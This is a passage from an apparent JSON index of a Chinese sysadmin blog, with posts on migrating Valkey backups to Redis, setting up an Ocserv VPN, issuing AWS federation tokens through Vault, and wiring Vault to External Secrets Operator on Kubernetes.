class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0005.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;8377-10081\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;1540505\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看起来是5个rdb备份，每个文件对应redis不同的slots\u003c/p\u003e\n\u003cp\u003e用rdb来解析备份文件，结果失败，因为不认识valkey rdb的版本。\u003c/p\u003e\n\u003cp\u003e没办法了，又找到了这个软件\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/HDT3213/rdb\"\u003ehttps://github.com/HDT3213/rdb\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e下载后，首先想处理成json文件，然后灌入到redis.io\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./rdb-linux-amd64 -c json -o 0001.json valeky-20250819-0001.rdb\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e失败，因为json文件灌入的时候redis.io又被阉割了，命令不支持\u003c/p\u003e","title":"AWS托管的Valkey数据转移到社区Redis.io去"},{"content":"由于ios的openvpn大陆地区无法安装，而员工又需要手机或PC登录VPN访问云上的资源，没办法，找了又找，终于，发现cisco的vpn还是能在苹果市场下载安装的，那就装个开源的Ocserv吧，别说还挺好，能分组控制路由的发布，非常不错\n记录一下安装配置过程，使用Ubuntu 24.04的底版：\napt update apt upgrade apt-cache show ocserv apt-get install -y ocserv ocserv --version 安装步骤就如上，非常简单，跟openvpn一样，配置文件就一个 /etc/ocserv/ocserv.conf, 编辑一下：\n# 认证方式为用户名密码认证 auth = \u0026#34;plain[passwd=/etc/ocserv/passwd]\u0026#34; # 开放端口 tcp-port = 443 udp-port = 443 # 证书 server-cert = /etc/ocserv/_.rendoumi.com.crt server-key = /etc/ocserv/_.rendoumi.com.key # 最多用户数 max-clients = 1024 # 绑定域名 default-domain = m.rendoumi.com # 分配的动态ip段 ipv4-network = 10.8.12.0 ipv4-netmask = 255.255.255.0 # 不路由 no-route = 10.0.0.0/255.0.0.0 no-route = 172.16.0.0/255.240.0.0 no-route = 192.168.0.0/255.255.0.0 # 发布路由 route = 10.8.2.15/32 route = 10.10.247.234/32 route = 10.10.240.37/32 说明：端口开在了443端口，证书用的是acme的免费证书，域名是m.rendoumi.com，ip段是10.8.12.0/24\n然后首先私网路由全禁止，然后只放了3条/32的单独ip路由，这样就好了\n最后转发设置一下，这台服务器的内网地址是 10.10.240.249\n# 设置转发 cat /etc/sysctl.conf net.ipv4.ip_forward = 1 # 设置iptalbes iptables -t nat -A POSTROUTING -s 10.8.12.0/24 -j SNAT --to-source 10.10.240.249 # 生成用户认证文件 ocpasswd -c /etc/ocserv/passwd zhangrr 然后去IOS下载Cisco secure client，直接建立m.rendoumi.com的连接，输入用户名和密码，就可以连接了。\n","permalink":"https://rendoumi.com/posts/20250819-oserv_vpn/","summary":"\u003cp\u003e由于ios的openvpn大陆地区无法安装，而员工又需要手机或PC登录VPN访问云上的资源，没办法，找了又找，终于，发现cisco的vpn还是能在苹果市场下载安装的，那就装个开源的Ocserv吧，别说还挺好，能分组控制路由的发布，非常不错\u003c/p\u003e\n\u003cp\u003e记录一下安装配置过程，使用Ubuntu 24.04的底版：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt upgrade\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-cache show ocserv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt-get install -y ocserv\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eocserv --version\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e安装步骤就如上，非常简单，跟openvpn一样，配置文件就一个 \u003ccode\u003e/etc/ocserv/ocserv.conf\u003c/code\u003e, 编辑一下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 认证方式为用户名密码认证\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eauth\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;plain[passwd=/etc/ocserv/passwd]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 开放端口\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcp-port \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e443\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eudp-port \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e443\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 证书\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver-cert \u003cspan class=\"o\"\u003e=\u003c/span\u003e /etc/ocserv/_.rendoumi.com.crt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eserver-key \u003cspan class=\"o\"\u003e=\u003c/span\u003e /etc/ocserv/_.rendoumi.com.key\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 最多用户数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emax-clients \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1024\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 绑定域名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edefault-domain \u003cspan class=\"o\"\u003e=\u003c/span\u003e m.rendoumi.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 分配的动态ip段\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipv4-network \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.8.12.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipv4-netmask \u003cspan class=\"o\"\u003e=\u003c/span\u003e 255.255.255.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 不路由\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-route \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.0.0.0/255.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-route \u003cspan class=\"o\"\u003e=\u003c/span\u003e 172.16.0.0/255.240.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eno-route \u003cspan class=\"o\"\u003e=\u003c/span\u003e 192.168.0.0/255.255.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 发布路由\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eroute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.8.2.15/32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eroute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.10.247.234/32\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eroute\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e 10.10.240.37/32\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e说明：端口开在了443端口，证书用的是acme的免费证书，域名是m.rendoumi.com，ip段是10.8.12.0/24\u003c/p\u003e","title":"Ocserv VPN的安装和使用"},{"content":"Vault的使用继续深入，通常情况下都是先拿到valut的root token，然后登录设置aws的认证，同时把aws的iam root凭据灌进去，然后write进行论转，这样凭据就只存在于vault之中了，没有泄露的可能。然后从这个root凭据再派生成各种使用时长有限制的临时凭据用。\n但是，嘿嘿，我偏偏没有root凭据，因为我是外面管理员。只能用 federation_token 进行登录。\n那怎么使用呢？方法如下：\n首先在AWS的IAM建立两个policy\n# Federator 的policy，用于获得token { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;VisualEditor0\u0026#34;, \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: \u0026#34;sts:GetFederationToken\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } # Change-self-access-keys 的policy，用于轮转key { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:ListUsers\u0026#34;, \u0026#34;iam:GetAccountPasswordPolicy\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;iam:*AccessKey*\u0026#34;, \u0026#34;iam:GetUser\u0026#34; ], \u0026#34;Resource\u0026#34;: [ \u0026#34;arn:aws:iam::*:user/${aws:username}\u0026#34; ] } ] } 然后在Vault中设置使用AWS secrets\nvault secrets enable aws # aws中需要对应IAM的权限 # 要么是真有aws iam的用户；要么是有一个role，和对应的临时用户；二选一 vault write aws/config/root access_key=YYY \\ secret_key=XXX region=us-east-1 \\ sts_endpoint=https://sts.us-east-1.amazonaws.com sts_region=us-east-1 # 轮转root凭据，这样root凭据就只存在于vault中了 vault write -force aws/config/rotate-root 使用方法：\n# 首先vault先建一个角色，这里的角色是ec2-admin： vault write aws/roles/$role - \u0026lt; aws/roles/$role.json 内容如下： { \u0026#34;credential_type\u0026#34;: \u0026#34;federation_token\u0026#34;, \u0026#34;default_sts_ttl\u0026#34;: 300, \u0026#34;iam_groups\u0026#34;: null, \u0026#34;max_sts_ttl\u0026#34;: 3600, \u0026#34;policy_arns\u0026#34;: [ \u0026#34;arn:aws:iam::aws:policy/AmazonEC2FullAccess\u0026#34; ], \u0026#34;policy_document\u0026#34;: \u0026#34;\u0026#34; } # 拿到AK vault write aws/sts/ec2-admin ttl=15m Key Value --- ----- lease_id aws/sts/ec2-admin/NNN lease_duration 14m59s lease_renewable false access_key XXX secret_key YYY security_token ZZZ ttl 14m59s 正常使用AWS的凭据的文章：\nhttps://devopstronaut.com/hashicorp-vault-101-10-step-by-step-guide-to-configuring-dynamic-aws-credentials-using-iam-user-edb5a75f868a https://notes.kodekloud.com/docs/HashiCorp-Certified-Vault-Associate-Certification/Compare-and-Configure-Secrets-Engines/Demo-AWS-Secrets-Engine-IAM ","permalink":"https://rendoumi.com/posts/20250818-vault_sts_token/","summary":"\u003cp\u003eVault的使用继续深入，通常情况下都是先拿到valut的root token，然后登录设置aws的认证，同时把aws的iam root凭据灌进去，然后write进行论转，这样凭据就只存在于vault之中了，没有泄露的可能。然后从这个root凭据再派生成各种使用时长有限制的临时凭据用。\u003c/p\u003e\n\u003cp\u003e但是，嘿嘿，我偏偏没有root凭据，因为我是外面管理员。只能用 federation_token 进行登录。\u003c/p\u003e\n\u003cp\u003e那怎么使用呢？方法如下：\u003c/p\u003e\n\u003cp\u003e首先在AWS的IAM建立两个policy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Federator 的policy，用于获得token\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Sid\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;VisualEditor0\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;sts:GetFederationToken\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Change-self-access-keys 的policy，用于轮转key\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Version\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;2012-10-17\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Statement\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:ListUsers\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:GetAccountPasswordPolicy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Effect\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;Allow\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Action\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:*AccessKey*\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;iam:GetUser\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;Resource\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:iam::*:user/\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eaws\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"nv\"\u003eusername\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e然后在Vault中设置使用AWS secrets\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evault secrets \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e aws\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# aws中需要对应IAM的权限\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 要么是真有aws iam的用户；要么是有一个role，和对应的临时用户；二选一\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evault write aws/config/root \u003cspan class=\"nv\"\u003eaccess_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eYYY \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003esecret_key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eXXX \u003cspan class=\"nv\"\u003eregion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eus-east-1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"nv\"\u003ests_endpoint\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttps://sts.us-east-1.amazonaws.com \u003cspan class=\"nv\"\u003ests_region\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eus-east-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 轮转root凭据，这样root凭据就只存在于vault中了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evault write -force aws/config/rotate-root\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e使用方法：\u003c/p\u003e","title":"Vault使用AWS的federation_token进行交互"},{"content":"今天是2025年8月15日，大噩耗啊： external-secrets / external-secrets Link\n⭐ 5416 | 🔀 1032 | Go 97.6%\nExternal Secrets Operator 项目暂停发布 由于维护团队规模过小，External Secrets Operator 决定暂停所有官方版本发布，直到重建足够的维护团队。\nKey Takeaways 项目暂停所有官方版本发布，包括新功能、补丁和容器镜像。 将继续审核和合并社区的 PR，但不会提供 GitHub Discussions、Slack 或问题评论的支持。 需要至少五名长期维护者来确保项目的可持续发展。 鼓励依赖该项目的公司或团队积极参与贡献。 贡献者可通过填写表单或查看治理文档加入项目。 居然暂停发布了，那就抓紧时间把Vault跟它的集成记录下来：\n一、首先必须在集群里安装Vault，然后安装external -secrets，都用helm装即可 helm repo add hashicorp https://helm.releases.hashicorp.com helm repo update helm install vault hashicorp/vault --set \u0026#34;server.dev.enabled=true\u0026#34; --set \u0026#34;injector.enabled=true\u0026#34; --namespace default helm repo add external-secrets https://charts.external-secrets.io helm repo update helm install external-secrets external-secrets/external-secrets --namespace external-secrets --create-namespace --set installCRDs=true 二、k8s授权，k8的授权体系就是 sa -\u0026gt; role -\u0026gt; rolebinding 那kubernetes会把pod中sa的Token注入到文件：/var/run/secrets/kubernetes.io/serviceaccount/token\n那调用k8s api中的token reviewer是可以对Token令牌进行验证的，我们先建立一系列k82资源\n--- apiVersion: v1 kind: ServiceAccount metadata: name: external-secrets-sa namespace: external-secrets --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: external-secrets-clusterrole rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;secrets\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;create\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;patch\u0026#34;, \u0026#34;delete\u0026#34;] - apiGroups: [\u0026#34;authorization.k8s.io\u0026#34;] resources: [\u0026#34;selfsubjectrulesreviews\u0026#34;] verbs: [\u0026#34;create\u0026#34;] --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: external-secrets-clusterrolebinding subjects: - kind: ServiceAccount name: external-secrets-sa namespace: external-secrets roleRef: kind: ClusterRole name: external-secrets-clusterrole apiGroup: rbac.authorization.k8s.io 如上，我们建立了一个sa，然后有api group的权限，同时授予了整个集群级别的权限\n三、登录vault，配置vault使用k8s的认证方式进行身份认证 那 enable kubernetes 其实设置了 vault 